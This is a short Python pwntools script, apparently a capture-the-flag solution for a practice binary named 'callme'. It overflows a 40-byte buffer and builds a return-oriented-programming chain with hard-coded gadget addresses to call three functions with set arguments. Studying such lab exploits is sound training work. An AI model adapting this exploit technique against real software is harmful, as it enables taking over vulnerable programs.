from pwn import *

#order of args to regs : rdi,rsi,rdx
callmeone = p64(0x0000000000401850)
callmetwo = p64(0x0000000000401870)
callmethree = p64(0x0000000000401810)
poprdi_rsi_rdx = p64(0x0000000000401ab0)
offset = 40
exit = p64(0x0000000000401880)
payload = "A"*40 + poprdi_rsi_rdx + p64(0x1) + p64(0x2) + p64(0x3) + callmeone + poprdi_rsi_rdx + p64(0x1) + p64(0x2) + p64(0x3) + callmetwo + poprdi_rsi_rdx + p64(0x1) + p64(0x2) + p64(0x3) + callmethree

p = process('./callme')
p.recvline()
p.sendline(payload)
p.interactive()
